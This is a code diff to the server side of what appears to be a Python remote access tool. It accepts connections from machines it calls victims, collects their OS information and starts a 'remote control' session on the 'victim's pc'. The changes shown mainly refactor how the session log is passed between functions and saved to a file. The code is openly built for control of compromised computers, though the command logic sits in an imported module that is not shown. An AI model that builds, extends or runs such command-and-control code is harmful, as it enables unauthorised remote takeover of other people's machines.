@@ -2,7 +2,7 @@ import signal
 import sys
 from remoteCommandsServer import *
 
-def main():
+def main(fileLog):
     try:
         signal.signal(signal.SIGINT, signalHandler)
         server = serverConnection()
@@ -17,7 +17,6 @@ def main():
                 os.mkdir(f"cartellaClient {addr}")
                 os.chdir(os.getcwd() + "/" + f"cartellaClient {addr}")
 
-                global fileLog
                 fileLog = fileLog + "\n" + f"[CONNECTED] Established a connection with the Victim; Socket: {addr} is connected to the server" + "\n"
 
                 for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[RECEIVING] Waiting for OS Info...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
@@ -27,7 +26,7 @@ def main():
 
                 # RICEVO INFORMAZIONI SISTEMA OPERATIVO
                 try:
-                    buff=printInformazioni(clientConnection,addr)
+                    buff,fileLog= printInformazioni(clientConnection,addr,fileLog)
                 except Exception as e:
                     #traceback.print_exc()
                     if e.__class__.__name__ == "ConnectionResetError":
@@ -46,8 +45,15 @@ def main():
                         for i in tqdm(range(25), desc=Fore.LIGHTWHITE_EX + f"[REMOTE CONTROL] Starting procedure...", colour="green", ncols=65, bar_format="{desc}: {percentage:3.0f}% {bar}"):
                             sleep(0.2)
                         print(f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n")
-                        remoteControl(clientConnection,buff)
+                        fileLog=fileLog+"\n"+ f"[REMOTE CONTROL] Procedure activated; you are now on the victim's pc in the path below...\n"
+                        typeExit, fileLog=remoteControl(clientConnection,buff,fileLog)
                         attivo = 0
+                        if typeExit=="[ERROR]":
+                            raise Exception
+                        elif typeExit=="[ERROR CONNECTION]":
+                            raise ConnectionResetError
+                        elif typeExit=="[END]":
+                            pass
 
                     except Exception as e:
                         #traceback.print_exc()
@@ -66,6 +72,12 @@ def main():
                 fileLog = fileLog + "\n" + f"[CLOSED] Client Connection {addr} closed succesfully!" + "\n"
                 print()
 
+                file = open("fileLog.txt", "w")
+                file.write(fileLog)
+                file.close()
+                fileLog = ""
+                os.chdir("..")
+
                 # Le operazioni sono concluse e decido come procedere
                 print(f"[DECISION] Do you want to close the Sever or keep listening for new Clients?")
                 print(f"[DECISION] 1 - Keep Listening")
@@ -75,19 +87,9 @@ def main():
                 if restartDecision == '2':
                     exit = True
                     print(f"[INFO] The Server was shut down successfully")
-                    file = open("fileLog.txt", "w")
-                    file.write(fileLog)
-                    file.close()
-                    fileLog = ""
-                    os.chdir("..")
                     server.close()
                     sys.exit(0)
                 elif restartDecision == '1':
-                    file = open("fileLog.txt", "w")
-                    file.write(fileLog)
-                    file.close()
-                    fileLog=""
-                    os.chdir("..")
                     print(f"[INFO] The server keeps listening...")
                     t_end = time.time() + 3
                     while time.time() < t_end:
@@ -110,18 +112,24 @@ def main():
         #traceback.print_exc()
         if e.__class__.__name__ == "ConnectionResetError":
             print(f"[CONNECTION INTERRUPTED] Connessione interrotta\n")
+            file = open("fileLog.txt", "w")
+            file.write(fileLog)
+            file.close()
+            fileLog = ""
             raise e
         else:
+            file = open("fileLog.txt", "w")
+            file.write(fileLog)
+            file.close()
+            fileLog = ""
             raise e
 
 if __name__ == "__main__":
     try:
-        main()
+        fileLog = f"###          FILELOG RESULT          ###\n"
+        main(fileLog)
     except:
         #traceback.print_exc()
-        file = open("fileLog.txt", "w")
-        file.write(fileLog)
-        file.close()
         fileLog = ""
         for i in tqdm(range(15), desc=Fore.LIGHTWHITE_EX + "Closing Server...", colour="green", ncols=50,
                       bar_format="{desc}: {percentage:3.0f}% {bar}"):
